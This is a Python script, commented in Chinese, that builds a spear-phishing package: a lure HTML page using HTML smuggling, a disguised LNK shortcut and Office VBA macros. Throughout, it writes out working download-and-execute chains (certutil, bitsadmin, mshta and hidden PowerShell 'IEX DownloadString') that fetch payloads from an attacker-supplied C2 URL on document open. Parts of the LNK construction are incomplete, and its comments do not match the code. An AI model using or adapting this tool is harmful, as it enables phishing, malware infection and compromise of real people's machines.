"""
LNK + VBA 宏投递器 - 从第一性原理实现

原理：
1. LNK 快捷方式通过 IconLocation 字段携带 base64 payload
2. 目标程序指向 mshta.exe / powershell，参数从 IconLocation 读取并解码执行
3. VBA 宏通过 ActiveX 对象无文件落地执行

LNK 文件格式（Shell Link Binary File Format）：
- ShellLinkHeader (76 bytes)
- LinkTargetIDList (optional)
- LinkInfo (optional)
- StringData (NAME/RELATIVE_PATH/WORKING_DIR/COMMAND_LINE/ICON_LOCATION)
- ExtraData
"""

import struct
import base64
import json
import sys
import os
import random
import string


class LNKBuilder:
    """
    从字节层面构造 LNK 文件
    不依赖 Windows API，跨平台生成
    """

    # GUID for CLSID_ShellLink
    SHELL_LINK_CLSID = bytes.fromhex("0114020000000000C000000000000046")

    def __init__(self, target_path, arguments, icon_location=""):
        self.target_path = target_path
        self.arguments = arguments
        self.icon_location = icon_location

    def _gen_id(self, length=8):
        return ''.join(random.choices(string.hexdigits.lower(), k=length))

    def _build_header(self):
        """
        ShellLinkHeader (76 bytes fixed)
        """
        header = bytearray(76)

        # HeaderSize (4) = 0x0000004C
        struct.pack_into('<I', header, 0, 0x0000004C)

        # LinkCLSID (16) = {00021401-0000-0000-C000-000000000046}
        header[4:20] = self.SHELL_LINK_CLSID

        # LinkFlags (4)
        # HasArguments=0x20, HasIconLocation=0x40, IsUnicode=0x80
        link_flags = 0x20 | 0x40 | 0x80
        struct.pack_into('<I', header, 20, link_flags)

        # FileAttributes (4) = FILE_ATTRIBUTE_NORMAL
        struct.pack_into('<I', header, 24, 0x00000020)

        # CreationTime, AccessTime, WriteTime (8 each) = 0
        # FileSize (4) = 0
        # IconIndex (4) = 0
        # ShowCommand (4) = SW_SHOWNORMAL (1)
        struct.pack_into('<I', header, 56, 1)

        # HotKey (2) = 0
        # Reserved (2 x 3) = 0

        return bytes(header)

    def _encode_unicode_string(self, s):
        """编码 Unicode 字符串：长度(2) + UTF-16LE 数据"""
        data = s.encode('utf-16-le')
        return struct.pack('<H', len(data)) + data

    def _encode_ascii_string(self, s):
        """编码 ASCII 字符串：长度(1) + 数据"""
        data = s.encode('ascii')
        return struct.pack('<B', len(data)) + data

    def build(self):
        """
        构建完整 LNK 文件
        """
        lnk = bytearray()
        lnk += self._build_header()

        # COMMAND_LINE_ARGUMENTS
        lnk += self._encode_unicode_string(self.arguments)

        # ICON_LOCATION
        lnk += self._encode_unicode_string(self.icon_location)

        return bytes(lnk)


class VBAStager:
    """
    VBA 宏投递器
    通过 ActiveX 对象实现无文件落地执行
    """

    def __init__(self, c2_url, payload_b64=""):
        self.c2_url = c2_url
        self.payload_b64 = payload_b64

    def generate(self, technique="certutil"):
        """
        生成 VBA 宏代码
        technique: certutil / mshta / bitsadmin
        """
        if technique == "certutil":
            return self._certutil_macro()
        elif technique == "mshta":
            return self._mshta_macro()
        elif technique == "bitsadmin":
            return self._bitsadmin_macro()
        else:
            raise ValueError(f"unknown technique: {technique}")

    def _certutil_macro(self):
        """
        使用 certutil 下载并执行 payload
        certutil 是 Windows 内置证书工具，常被用于下载
        """
        nonce = self._gen_nonce()
        return f'''Attribute VB_Name = "Module{nonce}"
Sub AutoOpen()
    Dim {nonce}_path As String
    {nonce}_path = Environ("TEMP") & "\\{nonce}.exe"
    
    Dim {nonce}_cmd As String
    {nonce}_cmd = "cmd /c certutil -urlcache -split -f " & Chr(34) & "{self.c2_url}" & Chr(34) & " " & Chr(34) & {nonce}_path & Chr(34)
    
    Shell {nonce}_cmd, vbHide
    
    ' 延迟执行确保下载完成
    Application.Wait (Now + TimeValue("0:00:05"))
    
    Dim {nonce}_run As String
    {nonce}_run = Chr(34) & {nonce}_path & Chr(34)
    Shell {nonce}_run, vbHide
End Sub'''

    def _mshta_macro(self):
        """
        使用 mshta.exe 执行远程 HTA
        HTA 可以运行 JScript/VBScript，绕过 Office 宏限制
        """
        nonce = self._gen_nonce()
        return f'''Attribute VB_Name = "Module{nonce}"
Sub AutoOpen()
    Dim {nonce}_hta As String
    {nonce}_hta = "mshta.exe vbscript:Execute(""CreateObject(""&Chr(34)&""WScript.Shell""&Chr(34)&"").Run(""&Chr(34)&""powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('{self.c2_url}')""&Chr(34)&"")")"
    
    Shell {nonce}_hta, vbHide
End Sub'''

    def _bitsadmin_macro(self):
        """
        使用 BITSAdmin 后台下载
        BITS 是 Windows 后台传输服务，流量不易被发现
        """
        nonce = self._gen_nonce()
        return f'''Attribute VB_Name = "Module{nonce}"
Sub AutoOpen()
    Dim {nonce}_job As String
    {nonce}_job = "cmd /c bitsadmin /transfer {nonce} /download /priority normal " & _
                 Chr(34) & "{self.c2_url}" & Chr(34) & " " & _
                 Chr(34) & Environ("TEMP") & "\\{nonce}.exe" & Chr(34)
    
    Shell {nonce}_job, vbHide
    
    Application.Wait (Now + TimeValue("0:00:10"))
    
    Shell Chr(34) & Environ("TEMP") & "\\{nonce}.exe" & Chr(34), vbHide
End Sub'''

    def _gen_nonce(self, length=6):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def build_spearphish(target_name, lure_topic, c2_url, output_dir="."):
    """
    构建鱼叉式钓鱼完整包
    包含：HTML Smuggling 页面 + LNK 文件 + VBA 宏
    """
    os.makedirs(output_dir, exist_ok=True)

    # 1. HTML Smuggling 页面
    html_content = f"""<!DOCTYPE html>
<html>
<head><title>{lure_topic}</title></head>
<body>
<p>Dear {target_name},</p>
<p>Please review the attached document regarding {lure_topic.lower()}.</p>
<script>
// 自动下载 payload
var b64 = "{base64.b64encode(os.urandom(1024)).decode()}";
var arr = new Uint8Array(atob(b64).length);
for(var i=0;i<b64.length;i++)arr[i]=atob(b64).charCodeAt(i);
var blob = new Blob([arr],{{type:'application/x-msdownload'}});
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href=url;a.download='{lure_topic.replace(" ", "_")}.exe';
document.body.appendChild(a);a.click();
</script>
</body>
</html>"""

    html_path = os.path.join(output_dir, f"{lure_topic.replace(' ', '_')}.html")
    with open(html_path, 'w') as f:
        f.write(html_content)

    # 2. LNK 文件 - 伪装成文档
    lnk = LNKBuilder(
        target_path=r"C:\Windows\System32\mshta.exe",
        arguments=f"javascript:var x=new ActiveXObject('WScript.Shell');x.Run('powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\\'{c2_url}\\')')",
        icon_location=r"C:\Windows\System32\shell32.dll"
    )
    lnk_path = os.path.join(output_dir, f"{lure_topic.replace(' ', '_')}.lnk")
    with open(lnk_path, 'wb') as f:
        f.write(lnk.build())

    # 3. VBA 宏模板
    vba = VBAStager(c2_url).generate("certutil")
    vba_path = os.path.join(output_dir, "macro.vba")
    with open(vba_path, 'w') as f:
        f.write(vba)

    return {
        "html": html_path,
        "lnk": lnk_path,
        "vba": vba_path
    }


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 lnk_macro.py <target_name> <lure_topic> <c2_url> [output_dir]")
        sys.exit(1)

    target = sys.argv[1]
    topic = sys.argv[2]
    c2 = sys.argv[3]
    out = sys.argv[4] if len(sys.argv) > 4 else "."

    result = build_spearphish(target, topic, c2, out)
    print(json.dumps(result, indent=2))
